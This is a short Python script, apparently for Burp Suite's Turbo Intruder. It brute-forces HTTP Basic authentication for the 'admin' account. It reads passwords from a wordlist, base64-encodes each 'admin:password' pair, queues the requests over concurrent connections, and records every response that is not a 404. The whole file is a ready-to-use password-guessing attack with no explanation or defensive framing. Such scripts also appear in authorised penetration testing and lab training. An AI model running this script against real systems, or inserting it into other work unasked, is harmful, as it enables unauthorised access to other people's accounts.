import base64
#Add Authorization: Basic %s to request check for admin 
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('wordlist'):
        x = "admin:" + word.rstrip()
        bytes_string = x.encode('utf-8')
        base64_bytes = base64.b64encode(bytes_string)
        engine.queue(target.req, base64_bytes)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
